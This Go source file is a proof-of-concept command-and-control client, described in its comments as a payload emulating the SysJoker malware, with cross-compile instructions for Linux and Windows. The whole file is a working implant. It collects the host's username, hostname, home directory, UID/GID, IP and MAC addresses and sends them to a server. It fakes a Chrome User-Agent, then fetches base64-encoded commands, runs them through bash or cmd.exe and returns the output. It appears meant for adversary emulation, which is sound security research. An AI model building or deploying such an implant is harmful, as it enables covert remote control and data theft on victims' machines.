package main

/*
Purpose: Build a simple C2 server as a PoC
This is the client part that would be sent as a payload.

go env -w GOROOT="/usr/lib/go"
go env -w GOPATH="/home/thepcn3rd/go/workspaces/c2client/"

Make the directories - src
Copy the commonFunctions folder into the src directory so that it can be referenced

// To cross compile for linux
// GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -o c2client.bin -ldflags "-w -s" main.go

// To cross compile windows
// GOOS=windows GOARCH=amd64 go build -o c2client.exe -ldflags "-w -s" main.go

References:
Emulating this adversary... https://research.checkpoint.com/2023/israel-hamas-war-spotlight-shaking-the-rust-off-sysjoker/
OpenAI ChatGPT wrote the base of this program

*/

import (
	"bytes"
	cf "github.com/thepcn3rd/goAdventures/projects/commonFunctions"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
)

type registerInfo struct {
	OSInfo             string `json:"osInfo"`
	OSWorkingDirectory string `json:"osWorkingDirectory"`
	OSHostname         string `json:"osHostname"`
	Username           string `json:"username"`
	UserHomeDirectory  string `json:"userHomeDirectory"`
	UserGID            string `json:"userGID"`
	UserUID            string `json:"userUID"`
	IPAddresses        string `json:"ipAddresses"`
	MACAddresses       string `json:"macAddresses"`
}

type commandStruct struct {
	CommandID         string `json:"commandID"`
	Command           string `json:"command"`
	Results           string `json:"results"`
	TSResultsReturned string `json:"tsResultsReturned"`
}

func printOutput(reader io.Reader) {
	// Create buffer to read from the reader
	buffer := make([]byte, 1024)
	for {
		// Read from the reader
		n, err := reader.Read(buffer)
		if err != nil {
			if err != io.EOF {
				fmt.Println("Error reading:", err)
			}
			break
		}
		if n > 0 {
			// Print the read data
			fmt.Print(string(buffer[:n]))
		}
	}
}

func webRequest(byteData []byte, url string, isJson bool) []byte {
	// Skip the verification of a self-signed certificate
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	// Create a new POST request
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(byteData))
	cf.CheckError("Unable to send HTTP POST Request", err, true)

	if isJson == true {
		// Set the appropriate headers for JSON content
		req.Header.Set("Content-Type", "application/json")
	}

	// Set the User-Agent to something other than Go-http-client/2.0
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36")

	// Create an HTTP client
	client := &http.Client{}

	// Send the POST request
	resp, err := client.Do(req)
	cf.CheckError("Unable to send the HTTP request to the server", err, true)
	defer resp.Body.Close()

	// Read the response body
	respBody, err := io.ReadAll(resp.Body)
	cf.CheckError("Unable to read the response provided by the server", err, true)

	// Print the response status code and body
	//fmt.Println("Response Status:", resp.Status)
	//fmt.Println("Response Body:", string(respBody))

	return respBody
}

// Register bot
func registerClient(url string) string {
	var reg registerInfo
	var err error

	// Data to be sent in the POST request
	// Gather facts from a linux host... Windows version, username, MAC address, and various other data
	reg.OSInfo = runtime.GOOS
	reg.OSWorkingDirectory, err = os.Getwd()
	cf.CheckError("Unable to get current working directory", err, false)
	reg.OSHostname, err = os.Hostname()
	cf.CheckError("Unable to get the hostname", err, false)
	currentUser, err := user.Current()
	reg.Username = currentUser.Username
	reg.UserHomeDirectory = currentUser.HomeDir
	reg.UserGID = currentUser.Gid
	reg.UserUID = currentUser.Uid
	// Gather network information from the client
	interfaces, err := net.Interfaces()
	cf.CheckError("Unable to pull network interface information", err, false)
	for _, iface := range interfaces {
		addrs, err := iface.Addrs()
		cf.CheckError("Unable to pull the IP Addresses from the interface", err, false)
		for _, addr := range addrs {
			ipNet, ok := addr.(*net.IPNet)
			if ok && !ipNet.IP.IsLoopback() && ipNet.IP.To4() != nil {
				reg.IPAddresses += ipNet.IP.String() + ","
			}
		}
		reg.MACAddresses += iface.HardwareAddr.String() + ","
	}
	// Remove the trailing , if it exists
	reg.IPAddresses = reg.IPAddresses[:(len(reg.IPAddresses) - 1)]
	reg.MACAddresses = reg.MACAddresses[:(len(reg.MACAddresses) - 1)]

	// Convert the struct into json
	jsonData, err := json.Marshal(reg)
	//data := []byte(`{"key": "test"}`)

	respBody := webRequest(jsonData, url, true)
	//fmt.Println("Response Body:", string(respBody))

	uuidReturned := string(respBody)
	return uuidReturned
}

func requestCommand(url string, clientID string) commandStruct {

	respBody := webRequest([]byte(clientID), url, false)
	//fmt.Println("Response Body:", string(respBody))

	var cmdStruct commandStruct
	err := json.Unmarshal(respBody, &cmdStruct)
	cf.CheckError("Unable to convert json to command structure", err, true)

	return cmdStruct
}

func executeCommand(url string, clientID string, cmdStruct commandStruct) {
	// Currently configured for linux and windows
	var cmd *exec.Cmd
	// Decode the base64 command prior to execution
	decodedBytes, err := base64.StdEncoding.DecodeString(cmdStruct.Command)
	cf.CheckError("Unable to base64 decode the command sent", err, true)
	if cmdStruct.Command != "" && cmdStruct.CommandID != "" {
		decodedCommand := string(decodedBytes)
		//fmt.Println(decodedCommand)
		if runtime.GOOS == "linux" {
			cmd = exec.Command("bash", "-c", decodedCommand)
		} else {
			cmd = exec.Command("cmd.exe")
			// Add a line break to the command...
			decodedCommand = decodedCommand + "\n"
			stdin, err := cmd.StdinPipe()
			if err != nil {
				log.Fatal(err)
			}

			go func() {
				defer stdin.Close()
				// Reference: https://pkg.go.dev/os/exec#example-Cmd.StdinPipe
				// Work around the escaping of the command line by injecting into the io.WriteCloser when cmd.exe is open...
				// The way this is handled you do not need to escape the quotes
				io.WriteString(stdin, decodedCommand)
			}()
		}

		// View the command being sent...
		//fmt.Println(cmd.Args)

		output, err := cmd.CombinedOutput()
		cf.CheckError("Unable to execute command that was sent", err, false)
		//fmt.Printf("OUTPUT:\n%s\n\n", output)

		// Encode the string to base64
		var encodedString string
		if len(output) > 1 {
			encodedString = base64.StdEncoding.EncodeToString([]byte(output))
		} else {
			encodedString = "Executed"
		}
		//fmt.Println(encodedString)
		cmdStruct.Results = encodedString

		// Convert the struct into json
		jsonData, err := json.Marshal(cmdStruct)

		respBody := webRequest(jsonData, url, true)
		respBody = respBody
		//fmt.Println("Response Body:", string(respBody))
	}

}

func main() {
	urlPTR := flag.String("url", "https://127.0.0.1", "Default URL to connect to the Server URL")
	flag.Parse()

	registrationURL := *urlPTR + "/api/attach"
	clientID := registerClient(registrationURL)

	requestURL := *urlPTR + "/api/req"
	cmdStruct := requestCommand(requestURL, clientID)

	// If no commands are retrieved do not do anything...
	if cmdStruct.CommandID != "" && cmdStruct.Command != "" {
		responseURL := *urlPTR + "/api/req/res"
		executeCommand(responseURL, clientID, cmdStruct)
	}
}
